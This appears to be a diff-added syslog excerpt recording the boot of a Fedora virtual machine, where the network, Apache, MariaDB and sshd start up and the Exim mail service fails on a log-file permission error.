+Dec 14 01:37:07 localhost kernel: input: Video Bus as /devices/LNXSYSTM:00/LNXSYBUS:00/PNP0A03:00/LNXVIDEO:00/input/input6
+Dec 14 01:37:07 localhost kernel: piix4_smbus 0000:00:07.0: SMBus Host Controller at 0x4100, revision 0
+Dec 14 01:37:07 localhost kernel: ppdev: user-space parallel port driver
+Dec 14 01:37:07 localhost kernel: snd_intel8x0 0000:00:05.0: disable (unknown or VT-d) VM optimization
+Dec 14 01:37:07 localhost systemd: Found device VBOX_HARDDISK 1.
+Dec 14 01:37:07 localhost systemd: Starting File System Check on /dev/disk/by-uuid/99263884-28d9-4cf3-a73c-24a1836f121e...
+Dec 14 01:37:07 localhost systemd: Found device /dev/mapper/fedora-swap.
+Dec 14 01:37:07 localhost systemd: Activating swap /dev/mapper/fedora-swap...
+Dec 14 01:37:07 localhost systemd: Activated swap /dev/mapper/fedora-swap.
+Dec 14 01:37:07 localhost systemd: Reached target Swap.
+Dec 14 01:37:07 localhost systemd: Starting Swap.
+Dec 14 01:37:07 localhost systemd-fsck: /dev/sda1: clean, 341/128016 files, 121411/512000 blocks
+Dec 14 01:37:07 localhost systemd: Started File System Check on /dev/disk/by-uuid/99263884-28d9-4cf3-a73c-24a1836f121e.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-fsck@dev-disk-by\x2duuid-99263884\x2d28d9\x2d4cf3\x2da73c\x2d24a1836f121e comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Mounting /boot...
+Dec 14 01:37:07 localhost systemd: Mounted /boot.
+Dec 14 01:37:07 localhost systemd: Reached target Local File Systems.
+Dec 14 01:37:07 localhost systemd: Starting Local File Systems.
+Dec 14 01:37:07 localhost systemd: Started Mark the need to relabel after reboot.
+Dec 14 01:37:07 localhost systemd: Starting Restore /run/initramfs on shutdown...
+Dec 14 01:37:07 localhost systemd: Starting Import network configuration from initramfs...
+Dec 14 01:37:07 localhost systemd: Started Relabel all filesystems, if necessary.
+Dec 14 01:37:07 localhost systemd: Started Commit a transient machine-id on disk.
+Dec 14 01:37:07 localhost systemd: Started Rebuild Journal Catalog.
+Dec 14 01:37:07 localhost systemd: Started Update is Completed.
+Dec 14 01:37:07 localhost kernel: Adding 839676k swap on /dev/mapper/fedora-swap.  Priority:-1 extents:1 across:839676k FS
+Dec 14 01:37:07 localhost kernel: EXT4-fs (sda1): mounted filesystem with ordered data mode. Opts: (null)
+Dec 14 01:37:07 localhost systemd: Started Restore /run/initramfs on shutdown.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=dracut-shutdown comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Started Import network configuration from initramfs.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=fedora-import-state comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Starting Create Volatile Files and Directories...
+Dec 14 01:37:07 localhost systemd-tmpfiles: Cannot set file attribute for '/var/log/journal', value=0x00800000, mask=0x00800000: Operation not supported
+Dec 14 01:37:07 localhost kernel: snd_intel8x0 0000:00:05.0: white list rate for 1028:0177 is 48000
+Dec 14 01:37:07 localhost systemd-tmpfiles: Cannot set file attribute for '/var/log/journal/b74ff8c513354faa8633ee944bc76c73', value=0x00800000, mask=0x00800000: Operation not supported
+Dec 14 01:37:07 localhost systemd: Started Create Volatile Files and Directories.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-tmpfiles-setup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Reached target Sound Card.
+Dec 14 01:37:07 localhost systemd: Starting Sound Card.
+Dec 14 01:37:07 localhost systemd: Starting Security Auditing Service...
+Dec 14 01:37:07 localhost audit: CONFIG_CHANGE auid=4294967295 ses=4294967295 op="add_rule" key=(null) list=1 res=1
+Dec 14 01:37:07 localhost auditctl: No rules
+Dec 14 01:37:07 localhost systemd: Started Security Auditing Service.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=auditd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Starting Update UTMP about System Boot/Shutdown...
+Dec 14 01:37:07 localhost auditd[655]: Started dispatcher: /sbin/audispd pid: 663
+Dec 14 01:37:07 localhost audit: CONFIG_CHANGE audit_enabled=1 old=1 auid=4294967295 ses=4294967295 res=1
+Dec 14 01:37:07 localhost audit: CONFIG_CHANGE audit_pid=655 old=0 auid=4294967295 ses=4294967295 res=1
+Dec 14 01:37:07 localhost auditd[655]: Init complete, auditd 2.4.4 listening for events (startup state enable)
+Dec 14 01:37:07 localhost audit: SYSTEM_BOOT pid=661 uid=0 auid=4294967295 ses=4294967295 msg=' comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Started Update UTMP about System Boot/Shutdown.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-update-utmp comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Reached target System Initialization.
+Dec 14 01:37:07 localhost systemd: Starting System Initialization.
+Dec 14 01:37:07 localhost systemd: Started dnf makecache timer.
+Dec 14 01:37:07 localhost systemd: Starting dnf makecache timer.
+Dec 14 01:37:07 localhost systemd: Started Daily Cleanup of Temporary Directories.
+Dec 14 01:37:07 localhost systemd: Starting Daily Cleanup of Temporary Directories.
+Dec 14 01:37:07 localhost audispd: priority_boost_parser called with: 4
+Dec 14 01:37:07 localhost audispd: max_restarts_parser called with: 10
+Dec 14 01:37:07 localhost audispd: No plugins found, exiting
+Dec 14 01:37:07 localhost systemd: Started Updates mlocate database every day.
+Dec 14 01:37:07 localhost systemd: Starting Updates mlocate database every day.
+Dec 14 01:37:07 localhost systemd: Reached target Timers.
+Dec 14 01:37:07 localhost systemd: Starting Timers.
+Dec 14 01:37:07 localhost systemd: Listening on D-Bus System Message Bus Socket.
+Dec 14 01:37:07 localhost systemd: Starting D-Bus System Message Bus Socket.
+Dec 14 01:37:07 localhost systemd: Listening on PC/SC Smart Card Daemon Activation Socket.
+Dec 14 01:37:07 localhost systemd: Starting PC/SC Smart Card Daemon Activation Socket.
+Dec 14 01:37:07 localhost systemd: Reached target Sockets.
+Dec 14 01:37:07 localhost systemd: Starting Sockets.
+Dec 14 01:37:07 localhost systemd: Reached target Basic System.
+Dec 14 01:37:07 localhost systemd: Starting Basic System.
+Dec 14 01:37:07 localhost systemd: Started OpenSSH Server Key Generation.
+Dec 14 01:37:07 localhost systemd: Starting Machine Check Exception Logging Daemon...
+Dec 14 01:37:07 localhost systemd: Starting System Logging Service...
+Dec 14 01:37:07 localhost systemd: Starting Permit User Sessions...
+Dec 14 01:37:07 localhost systemd: Started D-Bus System Message Bus.
+Dec 14 01:37:07 localhost mcelog: Family 6 Model 8e CPU: only decoding architectural errors
+Dec 14 01:37:07 localhost systemd: Starting D-Bus System Message Bus...
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=dbus comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Started Hardware RNG Entropy Gatherer Daemon.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=rngd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Starting Hardware RNG Entropy Gatherer Daemon...
+Dec 14 01:37:07 localhost systemd: Starting Network Manager...
+Dec 14 01:37:07 localhost rngd: read error
+Dec 14 01:37:07 localhost rngd: read error
+Dec 14 01:37:07 localhost systemd: Started irqbalance daemon.
+Dec 14 01:37:07 localhost systemd: Starting irqbalance daemon...
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=irqbalance comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Starting Login Service...
+Dec 14 01:37:07 localhost systemd: Started Machine Check Exception Logging Daemon.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=mcelog comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Started Permit User Sessions.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-user-sessions comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost mcelog: mcelog: Family 6 Model 8e CPU: only decoding architectural errors
+Dec 14 01:37:07 localhost systemd: Started System Logging Service.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=rsyslog comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Started Command Scheduler.
+Dec 14 01:37:07 localhost systemd: Starting Command Scheduler...
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=crond comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Started Job spooling tools.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=atd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Starting Job spooling tools...
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  NetworkManager (version 1.0.6-6.fc23) is starting...
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Read config: /etc/NetworkManager/NetworkManager.conf and conf.d: 10-ibft-plugin.conf
+Dec 14 01:37:07 localhost systemd: Started Network Manager.
+Dec 14 01:37:07 localhost systemd: Reached target Network.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=NetworkManager comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Starting Network.
+Dec 14 01:37:07 localhost systemd: Started OpenSSH server daemon.
+Dec 14 01:37:07 localhost systemd: Starting OpenSSH server daemon...
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=sshd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Starting /etc/rc.d/rc.local Compatibility...
+Dec 14 01:37:07 localhost systemd: Starting Exim Mail Transport Agent...
+Dec 14 01:37:07 localhost systemd: Starting The Apache HTTP Server...
+Dec 14 01:37:07 localhost systemd: Starting MariaDB 10.0 database server...
+Dec 14 01:37:07 localhost systemd-logind: Watching system buttons on /dev/input/event0 (Power Button)
+Dec 14 01:37:07 localhost systemd-logind: Watching system buttons on /dev/input/event1 (Sleep Button)
+Dec 14 01:37:07 localhost systemd-logind: Watching system buttons on /dev/input/event5 (Video Bus)
+Dec 14 01:37:07 localhost systemd: Started Login Service.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-logind comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd-logind: New seat seat0.
+Dec 14 01:37:07 localhost systemd: Started Exim Mail Transport Agent.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=exim comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost crond[682]: (CRON) INFO (RANDOM_DELAY will be scaled with factor 82% if used.)
+Dec 14 01:37:07 localhost rc.local: Error: either "local" is duplicate, or "enp0s8" is a garbage.
+Dec 14 01:37:07 localhost systemd: Started /etc/rc.d/rc.local Compatibility.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=rc-local comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Started Getty on tty1.
+Dec 14 01:37:07 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:07 localhost systemd: Starting Getty on tty1...
+Dec 14 01:37:07 localhost systemd: Reached target Login Prompts.
+Dec 14 01:37:07 localhost systemd: Starting Login Prompts.
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded settings plugin ifcfg-rh: (c) 2007 - 2015 Red Hat, Inc.  To report bugs please use the NetworkManager mailing list. (/usr/lib64/NetworkManager/libnm-settings-plugin-ifcfg-rh.so)
+Dec 14 01:37:07 localhost crond[682]: (CRON) INFO (running with inotify support)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded settings plugin iBFT: (c) 2014 Red Hat, Inc.  To report bugs please use the NetworkManager mailing list. (/usr/lib64/NetworkManager/libnm-settings-plugin-ibft.so)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded settings plugin keyfile: (c) 2007 - 2015 Red Hat, Inc.  To report bugs please use the NetworkManager mailing list.
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  ifcfg-rh: new connection /etc/sysconfig/network-scripts/ifcfg-enp0s3 (b668b016-6f31-40d7-af44-aae7c8376e5c,"enp0s3")
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  monitoring kernel firmware directory '/lib/firmware'.
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded device plugin: NMVxlanFactory (internal)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded device plugin: NMVlanFactory (internal)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded device plugin: NMVethFactory (internal)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded device plugin: NMTunFactory (internal)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded device plugin: NMMacvlanFactory (internal)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded device plugin: NMInfinibandFactory (internal)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded device plugin: NMGreFactory (internal)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded device plugin: NMEthernetFactory (internal)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded device plugin: NMBridgeFactory (internal)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Loaded device plugin: NMBondFactory (internal)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  WiFi enabled by radio killswitch; enabled by state file
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  WWAN enabled by radio killswitch; enabled by state file
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  WiMAX enabled by radio killswitch; enabled by state file
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Networking is enabled by state file
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s8): new Ethernet device (carrier: OFF, driver: 'e1000', ifindex: 3)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s8): device state change: unmanaged -> unavailable (reason 'managed') [10 20 2]
+Dec 14 01:37:07 localhost kernel: IPv6: ADDRCONF(NETDEV_UP): enp0s8: link is not ready
+Dec 14 01:37:07 localhost kernel: e1000: enp0s8 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: RX
+Dec 14 01:37:07 localhost kernel: IPv6: ADDRCONF(NETDEV_UP): enp0s8: link is not ready
+Dec 14 01:37:07 localhost kernel: IPv6: ADDRCONF(NETDEV_CHANGE): enp0s8: link becomes ready
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s8): link connected
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  ifcfg-rh: add connection in-memory (7625647c-766a-4ce2-87e2-b500b39e69ad,"Wired connection 1")
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s8): created default wired connection 'Wired connection 1'
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s3): new Ethernet device (carrier: OFF, driver: 'e1000', ifindex: 2)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s3): device state change: unmanaged -> unavailable (reason 'managed') [10 20 2]
+Dec 14 01:37:07 localhost kernel: IPv6: ADDRCONF(NETDEV_UP): enp0s3: link is not ready
+Dec 14 01:37:07 localhost kernel: IPv6: ADDRCONF(NETDEV_UP): enp0s3: link is not ready
+Dec 14 01:37:07 localhost kernel: e1000: enp0s3 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: RX
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  ifcfg-rh: add connection in-memory (654f0ae0-663a-4ed2-bc13-5332c11742e6,"Wired connection 2")
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s3): created default wired connection 'Wired connection 2'
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (lo): link connected
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (lo): new Generic device (carrier: ON, driver: 'unknown', ifindex: 1)
+Dec 14 01:37:07 localhost kernel: IPv6: ADDRCONF(NETDEV_CHANGE): enp0s3: link becomes ready
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s8): device state change: unavailable -> disconnected (reason 'none') [20 30 0]
+Dec 14 01:37:07 localhost sshd[686]: Server listening on 0.0.0.0 port 22.
+Dec 14 01:37:07 localhost sshd[686]: Server listening on :: port 22.
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s3): link connected
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  wpa_supplicant stopped
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Auto-activating connection 'Wired connection 1'.
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s3): device state change: unavailable -> disconnected (reason 'carrier-changed') [20 30 40]
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Auto-activating connection 'Wired connection 2'.
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s8): Activation: starting connection 'Wired connection 1' (7625647c-766a-4ce2-87e2-b500b39e69ad)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s8): device state change: disconnected -> prepare (reason 'none') [30 40 0]
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  NetworkManager state is now CONNECTING
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s3): Activation: starting connection 'Wired connection 2' (654f0ae0-663a-4ed2-bc13-5332c11742e6)
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s8): device state change: prepare -> config (reason 'none') [40 50 0]
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s3): device state change: disconnected -> prepare (reason 'none') [30 40 0]
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s3): device state change: prepare -> config (reason 'none') [40 50 0]
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  (enp0s8): device state change: config -> ip-config (reason 'none') [50 70 0]
+Dec 14 01:37:07 localhost NetworkManager[674]: <info>  Activation (enp0s8) Beginning DHCPv4 transaction (timeout in 45 seconds)
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  dhclient started with pid 720
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  (enp0s3): device state change: config -> ip-config (reason 'none') [50 70 0]
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  Activation (enp0s3) Beginning DHCPv4 transaction (timeout in 45 seconds)
+Dec 14 01:37:08 localhost exim[707]: 2019-12-14 01:37:08 exim 4.86_2 daemon started: pid=707, -q1h, listening for SMTP on port 25 (IPv6 and IPv4) port 587 (IPv6 and IPv4) and for SMTPS on port 465 (IPv6 and IPv4)
+Dec 14 01:37:08 localhost exim[707]: 2019-12-14 01:37:08 Cannot open main log file "/var/log/exim/main.log": Permission denied: euid=93 egid=93
+Dec 14 01:37:08 localhost exim[707]: exim: could not open panic log - aborting: see message(s) above
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  dhclient started with pid 737
+Dec 14 01:37:08 localhost systemd: exim.service: Main process exited, code=exited, status=1/FAILURE
+Dec 14 01:37:08 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=exim comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=failed'
+Dec 14 01:37:08 localhost systemd: exim.service: Unit entered failed state.
+Dec 14 01:37:08 localhost systemd: exim.service: Failed with result 'exit-code'.
+Dec 14 01:37:08 localhost httpd: AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using localhost.localdomain. Set the 'ServerName' directive globally to suppress this message
+Dec 14 01:37:08 localhost dhclient[720]: Created duid \000\001\000\001%\206\371D\010\000'1\341\020.
+Dec 14 01:37:08 localhost dhclient[720]: DHCPDISCOVER on enp0s8 to 255.255.255.255 port 67 interval 4 (xid=0x222f274)
+Dec 14 01:37:08 localhost dhclient[720]: DHCPREQUEST on enp0s8 to 255.255.255.255 port 67 (xid=0x222f274)
+Dec 14 01:37:08 localhost dhclient[720]: DHCPOFFER from 10.0.3.2
+Dec 14 01:37:08 localhost dhclient[720]: DHCPACK from 10.0.3.2 (xid=0x222f274)
+Dec 14 01:37:08 localhost dhclient[737]: Created duid \000\001\000\001%\206\371D\010\000'(\355\242.
+Dec 14 01:37:08 localhost dhclient[737]: DHCPDISCOVER on enp0s3 to 255.255.255.255 port 67 interval 3 (xid=0x5bb18853)
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>    address 10.0.3.15
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>    plen 24 (255.255.255.0)
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>    gateway 10.0.3.2
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>    server identifier 10.0.3.2
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>    lease time 86400
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>    nameserver '192.168.1.20'
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>    domain name 'local'
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  (enp0s8): DHCPv4 state changed unknown -> bound
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  (enp0s8): device state change: ip-config -> ip-check (reason 'none') [70 80 0]
+Dec 14 01:37:08 localhost dbus[669]: [system] Activating via systemd: service name='org.freedesktop.nm_dispatcher' unit='dbus-org.freedesktop.nm-dispatcher.service'
+Dec 14 01:37:08 localhost systemd: Starting Network Manager Script Dispatcher Service...
+Dec 14 01:37:08 localhost dhclient[720]: bound to 10.0.3.15 -- renewal in 42941 seconds.
+Dec 14 01:37:08 localhost systemd: Started The Apache HTTP Server.
+Dec 14 01:37:08 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=httpd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:08 localhost dhclient[737]: DHCPREQUEST on enp0s3 to 255.255.255.255 port 67 (xid=0x5bb18853)
+Dec 14 01:37:08 localhost dhclient[737]: DHCPOFFER from 192.168.56.100
+Dec 14 01:37:08 localhost dhclient[737]: DHCPACK from 192.168.56.100 (xid=0x5bb18853)
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>    address 192.168.56.130
+Dec 14 01:37:08 localhost dbus[669]: [system] Successfully activated service 'org.freedesktop.nm_dispatcher'
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>    plen 24 (255.255.255.0)
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>    server identifier 192.168.56.100
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>    lease time 1200
+Dec 14 01:37:08 localhost nm-dispatcher: Dispatching action 'pre-up' for enp0s8
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  (enp0s3): DHCPv4 state changed unknown -> bound
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  (enp0s3): device state change: ip-config -> ip-check (reason 'none') [70 80 0]
+Dec 14 01:37:08 localhost nm-dispatcher: Dispatching action 'pre-up' for enp0s3
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  (enp0s8): device state change: ip-check -> secondaries (reason 'none') [80 90 0]
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  (enp0s8): device state change: secondaries -> activated (reason 'none') [90 100 0]
+Dec 14 01:37:08 localhost systemd: Started Network Manager Script Dispatcher Service.
+Dec 14 01:37:08 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=NetworkManager-dispatcher comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  NetworkManager state is now CONNECTED_GLOBAL
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  NetworkManager state is now CONNECTED_SITE
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  NetworkManager state is now CONNECTED_GLOBAL
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  Policy set 'Wired connection 1' (enp0s8) as default for IPv4 routing and DNS.
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  (enp0s8): Activation: successful, device activated.
+Dec 14 01:37:08 localhost dhclient[737]: bound to 192.168.56.130 -- renewal in 489 seconds.
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  (enp0s3): device state change: ip-check -> secondaries (reason 'none') [80 90 0]
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  (enp0s3): device state change: secondaries -> activated (reason 'none') [90 100 0]
+Dec 14 01:37:08 localhost nm-dispatcher: Dispatching action 'up' for enp0s8
+Dec 14 01:37:08 localhost NetworkManager[674]: <info>  (enp0s3): Activation: successful, device activated.
+Dec 14 01:37:08 localhost nm-dispatcher: Dispatching action 'up' for enp0s3
+Dec 14 01:37:08 localhost systemd: Started MariaDB 10.0 database server.
+Dec 14 01:37:08 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=mariadb comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:08 localhost systemd: Reached target Multi-User System.
+Dec 14 01:37:08 localhost systemd: Starting Multi-User System.
+Dec 14 01:37:08 localhost systemd: Starting Update UTMP about System Runlevel Changes...
+Dec 14 01:37:08 localhost audit: SYSTEM_RUNLEVEL pid=821 uid=0 auid=4294967295 ses=4294967295 msg='old-level=N new-level=3 comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:08 localhost systemd: Started Update UTMP about System Runlevel Changes.
+Dec 14 01:37:08 localhost audit: SERVICE_START pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-update-utmp-runlevel comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:08 localhost systemd: Startup finished in 631ms (kernel) + 1.593s (initrd) + 1.905s (userspace) = 4.131s.
+Dec 14 01:37:08 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=systemd-update-utmp-runlevel comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:37:08 localhost mysqld_safe: 191214 01:37:08 mysqld_safe Logging to '/var/log/mariadb/mariadb.log'.
+Dec 14 01:37:08 localhost mysqld_safe: 191214 01:37:08 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysql
+Dec 14 01:37:13 localhost NetworkManager[674]: <info>  startup complete
+Dec 14 01:37:18 localhost audit: SERVICE_STOP pid=1 uid=0 auid=4294967295 ses=4294967295 msg='unit=NetworkManager-dispatcher comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'
+Dec 14 01:39:04 localhost audit: CRYPTO_KEY_USER pid=1906 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:55:7e:f1:22:af:6d:02:f2:79:13:e3:cf:60:6d:c3:f7:4b:aa:69:49:aa:45:64:c6:6e:34:d3:99:93:e0:b9:ac direction=? spid=1906 suid=0  exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=? res=success'
+Dec 14 01:39:04 localhost audit: CRYPTO_KEY_USER pid=1906 uid=0 auid=4294967295 ses=4294967295 msg='op=destroy kind=server fp=SHA256:85:01:8a:71:7c:fb:c5:51:b5:b1:86:28:d3:e0:ab:1f:dd:1f:39:2f:25:95:c4:57:4d:dc:ed:c2:1c:ed:a5:47 direction=? spid=1906 suid=0  exe="/usr/sbin/sshd" hostname=? addr=192.168.56.1 terminal=? res=success'
